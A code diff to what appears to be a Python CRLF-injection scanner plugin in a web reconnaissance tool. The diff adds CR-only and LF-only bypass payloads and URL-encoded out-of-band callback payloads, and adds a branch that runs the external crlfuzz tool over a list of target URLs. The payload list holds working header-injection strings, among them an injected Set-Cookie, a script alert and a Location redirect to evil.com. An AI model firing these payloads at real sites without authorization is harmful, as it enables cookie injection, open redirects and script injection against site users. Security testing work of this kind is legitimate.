@@ -10,6 +10,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote
 
 from menu import C
+from plugins import ensure_outdir
 from ..output import info, success, warn, error
 from ..http_utils import format_raw_request, format_raw_response
 
@@ -25,20 +26,15 @@ CRLF_PAYLOADS = [
     "%0d%0aSet-Cookie:%20crlf=injected",
     "%0d%0a%0d%0a<script>alert(1)</script>",
     "%0D%0AX-CRLF-Test:%20injected",
-    "\\r\\nX-CRLF-Test: injected",
     "%E5%98%8A%E5%98%8DX-CRLF-Test:%20injected",  # Unicode bypass
     "%0d%0aLocation:%20http://evil.com",
+    "%0a%20X-CRLF-Test:%20injected",  # LF-only bypass
+    "%0d%20X-CRLF-Test:%20injected",  # CR-only bypass
 ]
 
 # Header que indica CRLF bem-sucedido
 CRLF_INDICATOR = "x-crlf-test"
 COOKIE_INDICATOR = "crlf=injected"
-
-
-def ensure_outdir(target):
-    outdir = Path("output") / target / "crlf_injection"
-    outdir.mkdir(parents=True, exist_ok=True)
-    return outdir
 
 
 def test_crlf(client, url, payload):
@@ -137,7 +133,7 @@ def run(context: dict):
         f"🟥───────────────────────────────────────────────────────────🟥\n"
     )
 
-    outdir = ensure_outdir(target)
+    outdir = ensure_outdir(target, "crlf_injection")
     results_file = outdir / "crlf_results.json"
     
     # Carregar OAST payload (Interactsh) se existir
@@ -151,7 +147,7 @@ def run(context: dict):
     if oast_url:
         local_payloads.extend([
             f"%0d%0aLocation:%20http://{oast_url}",
-            f"\\r\\nReferer: http://{oast_url}",
+            f"%0d%0aReferer:%20http://{oast_url}",
             f"%0d%0aHost:%20{oast_url}",
             f"%0d%0aX-Forwarded-Host:%20{oast_url}"
         ])
@@ -167,6 +163,46 @@ def run(context: dict):
     
     all_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
     
+    # -----------------------------------------------------
+    # Execução do crlfuzz (Rápido e Preciso em Go)
+    # -----------------------------------------------------
+    import shutil
+    import subprocess
+    crlfuzz = shutil.which("crlfuzz")
+    
+    if crlfuzz:
+        info(f"   [i] Utilizando {C.BOLD}crlfuzz{C.END} (Go) para detecção rápida e massiva...")
+        crlfuzz_out = outdir / "crlfuzz_raw.txt"
+        
+        cmd = [crlfuzz, "-l", str(urls_file), "-s", "-o", str(crlfuzz_out)]
+        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        deduped = []
+        if crlfuzz_out.exists() and crlfuzz_out.stat().st_size > 0:
+            for line in crlfuzz_out.read_text(errors="ignore").splitlines():
+                if not line.strip(): continue
+                url_found = line.replace("[VULN]", "").strip()
+                deduped.append({
+                    "url": url_found,
+                    "payload": "CRLFuzz Default",
+                    "type": "CRLF Injection via crlfuzz",
+                    "risk": "HIGH",
+                    "details": "Detecção automática via CRLFuzz",
+                })
+                info(f"   🚨 {C.RED}CRLFuzz encontrou:{C.END} {url_found}")
+                
+        results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
+        if deduped:
+            success(f"💉 {len(deduped)} CRLF Injections encontrados pelo crlfuzz!")
+        else:
+            success("✅ Nenhuma CRLF Injection detectada pelo crlfuzz")
+        return [str(results_file)]
+
+    # -----------------------------------------------------
+    # Fallback: Execução em Python (se crlfuzz não existir)
+    # -----------------------------------------------------
+    warn("⚠️ 'crlfuzz' não encontrado no sistema. Rodando fallback engine em Python...")
+    
     # Filtrar URLs que têm parâmetros
     testable = [u for u in all_urls if "?" in u]
     
@@ -177,11 +213,11 @@ def run(context: dict):
     testable = testable[:150]
     
     if not testable:
-        info("Nenhuma URL encontrada para testar")
-        json.dump([], open(results_file, "w"))
+        info("Nenhuma URL encontrada para testar no fallback")
+        results_file.write_text("[]")
         return [str(results_file)]
     
-    info(f"   📊 Testando {len(testable)} URLs")
+    info(f"   📊 Testando {len(testable)} URLs via Script...")
     
     all_findings = []
     
@@ -215,8 +251,8 @@ def run(context: dict):
     results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
     
     if deduped:
-        success(f"💉 {len(deduped)} CRLF Injections encontrados!")
+        success(f"💉 {len(deduped)} CRLF Injections encontrados no script!")
     else:
-        success("✅ Nenhuma CRLF Injection detectada")
+        success("✅ Nenhuma CRLF Injection detectada no script")
     
     return [str(results_file)]
